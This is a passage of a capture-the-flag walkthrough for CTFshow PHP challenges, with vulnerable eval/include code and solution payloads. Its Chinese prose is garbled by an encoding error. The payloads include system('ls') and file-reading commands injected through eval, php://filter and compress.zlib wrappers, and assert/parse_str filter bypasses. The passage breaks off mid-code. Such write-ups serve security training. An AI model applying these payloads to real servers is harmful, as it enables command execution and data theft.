class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4><span id="web109">web109</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>æ–¹æ³•ä¸€ï¼šåå°„</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Reflectionclass&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Reflectionclass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šå¼‚å¸¸å¤„ç†</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Exception&amp;v2=system(&#x27;tac fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•ä¸‰ï¼šé”™è¯¯</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Error&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Error&amp;v2=system(&#x27;tac fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure></li></ul><h4><span id="web110">web110</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¦æ‰äº†åŒ¿åç±»çš„payload</p><p><strong>è¦æ±‚</strong>ï¼šä¸å…è®¸ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦ä¸æ•°å­—</p><p>ã€€ã€€ v1åªèƒ½æ˜¯ç±»ï¼Œv2ä¸ºå‡½æ•°æˆ–æ–¹æ³•ï¼Œä¸”æ— å‚æ•°</p><p><strong>åˆ†æ</strong>ï¼š</p><p> 1ã€web109 ä¸­çš„ v2 å…ˆä¸º system(ls) ï¼Œåä¸ºsystem(â€˜tac fl*â€™)</p><p>ã€€ã€€ã€€ã€€æ­¥éª¤ä¸ºï¼š1ï¼‰æŸ¥çœ‹ç›®å½• 2ï¼‰æŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p><p>ã€€ã€€ã€€ã€€ä½† ( è¢«ç¦ç”¨ï¼Œä¸èƒ½ä½¿ç”¨ system(ls) æŸ¥çœ‹ç›®å½•</p><p> 2ã€è€ƒè™‘æŸ¥çœ‹ç›®å½•å‡½æ•°çš„æ›¿ä»£ï¼šscandir()ã€golb()ã€dirname()ã€basename()ã€realpath()ã€getcwd()</p><p>ã€€ã€€ã€€ã€€å…¶ä¸­ scandir()ã€golb() ã€dirname()ã€basename()ã€realpath() éœ€è¦ç»™å®šå‚æ•°</p><p>ã€€ã€€ã€€ã€€è€Œ getcwd() ä¸éœ€è¦å‚æ•°</p><p>ã€€ã€€ã€€ã€€å¾ˆæ˜æ˜¾ v2&#x3D;getcwd</p><p> 3ã€v1 æˆ‘ä»¬é€‰æ‹©è¯»å–æ–‡ä»¶å†…ç½®ç±» FilesystemIterator</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="built_in">FilesystemIterator</span>&amp;v2=getcwd</span><br></pre></td></tr></table></figure><p>è®¿é—®æ–‡ä»¶å³å¯</p><h4><span id="web111">web111</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è¦æ±‚</strong>ï¼šv1ï¼Œv2 ä¸èƒ½åŒ…å«ç‰¹æ®Šç¬¦å·ä¸æ•°å­—ï¼Œv1 å¿…é¡»åŒ…å« ctfshow</p><p><strong>åˆ†æ</strong>ï¼š</p><p>ã€€ã€€1ã€getFlag ä¸­ä½¿ç”¨ var_dump() è¾“å‡º $$v1</p><p>ã€€ã€€ã€€ã€€$$v1 &#x3D; &amp;$$v2</p><p>ã€€ã€€ã€€ã€€$v2 ä¸ºå˜é‡ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œflag é€šå¸¸å­˜å‚¨åœ¨ $flag å˜é‡ä¸­ï¼Œå› æ­¤ï¼Œä»¤ v2 &#x3D; flagï¼Œåˆ™ç›¸å½“äº $$v1 &#x3D; $flag</p><p>ã€€ã€€ã€€ã€€æ„é€ çš„ payload ä¸º v1&#x3D;ctfshow&amp;v2&#x3D;flag</p><p>ã€€ã€€ã€€ã€€ä½†è¾“å‡ºä¸º NULL</p><p>ã€€ã€€ã€€ã€€<strong>åŸå› </strong>ï¼šï¼ˆå˜é‡èŒƒå›´ï¼‰</p><p>ã€€ã€€ã€€ã€€ã€€ã€€$flag åœ¨è‡ªå®šä¹‰å‡½æ•° getFlag å‡½æ•°ä¸­æ²¡æœ‰å®šä¹‰</p><p>ã€€ã€€ã€€ã€€ã€€ã€€$flag æ˜¯å±äº flag.php ä¸­çš„å˜é‡ï¼Œå¯¹äº getFlag æ˜¯å¤–éƒ¨å˜é‡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°† $flag æ”¹ä¸ºå…¨å±€å˜é‡</p><p>ã€€ã€€2ã€å®šä¹‰å…¨å±€å˜é‡çš„æ ¼å¼ä¸º global $flag</p><p>ã€€ã€€ã€€ã€€å¦‚æœ v2&#x3D;global $flag</p><p>ã€€ã€€ã€€ã€€é¦–å…ˆ $ è¢«å±è”½</p><p>ã€€ã€€ã€€ã€€å…¶æ¬¡ $$v1 &#x3D; &amp;$$v2 ï¼Œæ—¢ $$v1 &#x3D; &amp;$global $flag</p><p>ã€€ã€€3ã€è€ƒè™‘ä½¿ç”¨è¶…å…¨å±€å˜é‡ $GLOBALS</p><p><strong>çŸ¥è¯†ç‚¹</strong></p><p>ã€€ã€€1ã€å¼•ç”¨èµ‹å€¼ &amp;</p><p>ã€€ã€€2ã€å˜é‡èŒƒå›´</p><p>ã€€ã€€3ã€é¢„å®šä¹‰å˜é‡ä¸­çš„è¶…å…¨å±€å˜é‡ $GLOBALS</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h4><span id="web112">web112</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure><h4><span id="web113">web113</span></h4><p>è€ƒç‚¹ï¼šåˆ©ç”¨å‡½æ•°æ‰€èƒ½å¤„ç†çš„é•¿åº¦é™åˆ¶è¿›è¡Œç›®å½•æº¢å‡º</p><ul><li>è§£æ³•ä¸€</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/p</span><br><span class="line">roc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/pro</span><br><span class="line">c/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/</span><br><span class="line"><span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/se</span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><ul><li>è§£æ³•äºŒ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure><h4><span id="web123">web123</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­$c&lt;&#x3D;18ä¸çŸ¥é“æ˜¯å•¥æ„æ€</p><p>phpæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œå› æ­¤å¦‚æœå­—ç¬¦ä¸²å¼€å¤´æ˜¯å­—æ¯ï¼Œå’Œæ•°å­—æ¯”è¾ƒæ—¶å€™å°±ä¼šè¢«è½¬ä¸º0</p><ul><li><p>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨eval$cç›´æ¥è¾“å‡ºç»“æœ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="built_in">echo</span> $flag</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Payloadï¼š</span><br><span class="line"> </span><br><span class="line">GETï¼š?a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">POSTï¼šCTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line">                   </span><br><span class="line">GET:?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><blockquote><p>åˆ©ç”¨$_SERVER[â€˜argvâ€™]ï¼Œåœ¨å¤§ä½¬é‚£çœ‹äº†è¿™ä¸€å‡½æ•°çš„è®²è§£ã€‚</p><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚</p><p>â€˜argvâ€™</p><p>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query stringã€‚</p><p>æ„æ€å°±æ˜¯é€šè¿‡$_SERVER[â€˜argvâ€™]å°†$aå˜æˆæ•°ç»„ï¼Œå†åˆ©ç”¨æ•°ç»„çš„æ€§è´¨å°†fl0g&#x3D;flag_give_meä¼ å…¥ï¼ŒåŒæ—¶è¿˜ç»•è¿‡ç¬¬ä¸€ä¸ªifä¸­çš„!isset($_GET[â€˜fl0gâ€™]))ï¼Œç”¨+æ¥è¿›è¡Œåˆ†éš”ï¼Œä½¿å¾—æ•°ç»„ä¸­æœ‰å¤šä¸ªæ•°å€¼ã€‚</p><p>æ‰§è¡Œevalå‡½æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œ$cå³æ˜¯parse_str($a[1])ï¼Œä½¿å¾—fl0g&#x3D;flag_give_meï¼Œä»è€Œè¿›å…¥ç¬¬ä¸‰ä¸ªifè¯­å¥ã€‚</p></blockquote><p>åœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸º_ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡ºCTF_SHOW.COMè¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰.)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º_ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p></li><li><p>æ–¹æ³•ä¸‰ï¼šhighlight_file</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Payloadï¼š</span><br><span class="line"> </span><br><span class="line">GETï¼š?<span class="number">1</span>=flag.php</span><br><span class="line"> </span><br><span class="line">POSTï¼šCTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web127">web127</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span 